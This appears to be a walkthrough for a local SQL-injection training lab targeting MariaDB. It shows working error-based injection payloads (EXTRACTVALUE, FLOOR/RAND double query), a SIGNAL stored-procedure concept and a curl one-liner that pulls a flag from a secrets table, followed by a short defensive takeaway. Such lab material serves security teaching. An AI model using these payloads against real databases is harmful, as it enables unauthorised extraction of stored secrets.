<h4>Step 1: Identify the Blind-ish Behavior</h4>
<p>
    The application only confirms whether a test exists: it does not display test details.
    But errors ARE shown, giving us an error-based extraction channel.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Behavior</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>SIGNAL_TEST<br>
        <span class="prompt">SQL: </span>SELECT id, test_name FROM diagnostics WHERE test_name = 'SIGNAL_TEST'<br><br>
        <span class="prompt">Output: </span>Test "<strong>SIGNAL_TEST</strong>" exists in the diagnostics database.
    </div>
</div>

<h4>Step 2: Confirm Error Display</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span>MariaDB Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1
    </div>
</div>

<h4>Step 3: Enumerate Tables via EXTRACTVALUE</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Table Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- -<br><br>
        <span class="prompt">Error: </span>MariaDB Error: XPATH syntax error: '<strong>~diagnostics,signal_secrets</strong>'
    </div>
</div>

<h4>Step 4: Extract Flag via EXTRACTVALUE</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. EXTRACTVALUE Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret_value FROM signal_secrets LIMIT 1))) -- -<br><br>
        <span class="prompt">Error: </span>MariaDB Error: XPATH syntax error: '<strong>~FLAG{ma_s1gn4l_d14gn0st1cs}</strong>'
    </div>
</div>

<h4>Step 5: Alternative. Double Query Error (FLOOR/RAND)</h4>
<p>
    The classic double-query technique uses <code>COUNT(*)</code> with <code>GROUP BY</code>
    and <code>FLOOR(RAND(0)*2)</code> to force a duplicate key error that contains data.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Double Query Error</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT secret_value FROM signal_secrets LIMIT 1), 0x7e, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- -<br><br>
        <span class="prompt">Error: </span>MariaDB Error: Duplicate entry '<strong>FLAG{ma_s1gn4l_d14gn0st1cs}~1</strong>' for key 'group_key'
    </div>
</div>

<h4>Step 6: SIGNAL/GET DIAGNOSTICS Concept</h4>
<p>
    MariaDB's <code>SIGNAL</code> statement raises custom errors with user-defined messages.
    In a stored procedure context, an attacker could use SIGNAL to leak data through custom
    error messages: no XPATH functions needed.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. SIGNAL Concept (Stored Procedure)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Concept: </span>BEGIN<br>
        &nbsp;&nbsp;DECLARE msg VARCHAR(255);<br>
        &nbsp;&nbsp;SET msg = (SELECT secret_value FROM signal_secrets LIMIT 1);<br>
        &nbsp;&nbsp;SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = msg;<br>
        END;<br><br>
        <span class="prompt">Result: </span>Error 1644: FLAG{ma_s1gn4l_d14gn0st1cs}<br><br>
        <span class="prompt">GET DIAGNOSTICS: </span>After catching, use:<br>
        GET DIAGNOSTICS CONDITION 1 @msg = MESSAGE_TEXT;<br>
        <span class="prompt">// Captures error details into session variables</span>
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the secret value and paste it into the verification form:
    <code>FLAG{ma_s1gn4l_d14gn0st1cs}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mariadb/lab7" \<br> --data-urlencode "test=' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret_value FROM signal_secrets LIMIT 1))) -- -"<br><br>
        <span class="prompt">Result: </span>MariaDB Error: XPATH syntax error: '~<strong>FLAG{ma_s1gn4l_d14gn0st1cs}</strong>'
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> MariaDB supports three error-based extraction techniques:
    (1) <code>EXTRACTVALUE()</code>: XPATH syntax errors,
    (2) <code>UPDATEXML()</code>: XPATH syntax errors,
    (3) Double query with <code>FLOOR(RAND(0)*2)</code>: duplicate key errors.
    Additionally, MariaDB's <code>SIGNAL</code> statement can raise custom errors with arbitrary
    messages in stored procedure contexts, and <code>GET DIAGNOSTICS</code> captures error details
    into variables. These are powerful tools for both extraction and custom error manipulation.
    Defense: never display raw error messages to users: use generic error pages in production.
</div>
